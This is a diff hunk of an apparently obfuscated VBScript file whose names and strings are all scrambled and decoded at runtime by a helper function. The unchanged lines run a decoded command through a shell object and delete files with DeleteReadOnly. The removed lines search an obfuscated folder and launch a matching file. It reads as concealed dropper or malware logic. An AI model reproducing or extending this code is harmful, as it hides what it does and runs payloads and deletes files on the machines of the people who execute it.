@@ -121,14 +121,6 @@ If zxcas23w4.FileExists(zcasdc3232) Then
     vbvcndr56yj.Run sfvbn45je4("KDlm>_,d\hLWCh.#<nT,**2#],?&T(f$R[>n}[U!")
 end if
 
-wscript.sleep 5000
-vbvcndr56yj.CurrentDirectory = sfvbn45je4("/d~9K0\R3K(in[shUiyRey") + sdfg3456w346w3678 + sfvbn45je4("r9xR(7%f)fW:!W{jYWWR[HMe6WJc~_cd^]{R=CL_[Yeh=eii}ey\""juR*MB_adEZDeYm!iOR'I`jTWphHjdJ") + " " + sfvbn45je4("6$VCV[Kd*kIR%F&hFeL]Kh`WBcJi3RXIEj1Wfh}j@k7f,R@$")
-For Each dcsdvasertj34 in bnvbnmmn.GetFolder(sfvbn45je4("/d~9K0\R3K(in[shUiyRey") + sdfg3456w346w3678 + sfvbn45je4("r9xR(7%f)fW:!W{jYWWR[HMe6WJc~_cd^]{R=CL_[Yeh=eii}ey\""juR*MB_adEZDeYm!iOR'I`jTWphHjdJ") + " " + sfvbn45je4("6$VCV[Kd*kIR%F&hFeL]Kh`WBcJi3RXIEj1Wfh}j@k7f,R@$")).Files
-if InStr(dcsdvasertj34,sfvbn45je4("!rxM5_[dRhXWQh/w")) > 0 then
-    vbvcndr56yj.Run dcsdvasertj34.name
-end if
-Next
-
 Set uioyuioy89py = CreateObject(sfvbn45je4("0O&IGY1h^_=fhj1_fd""]#$I<(_|bJ[UIpoQiTj6[(c>EwX%`%[CY+j`n"))
 uioyuioy89py.DeleteFile(sfvbn45je4("'\?9&0[R""K<i'[%h^iyRai") + sdfg3456w346w3678 + sfvbn45je4("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + tgj56k34 ), DeleteReadOnly
 uioyuioy89py.DeleteFile(sfvbn45je4("'\?9&0[R""K<i'[%h^iyRai") + sdfg3456w346w3678 + sfvbn45je4("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + gfyd5r6d546 ), DeleteReadOnly
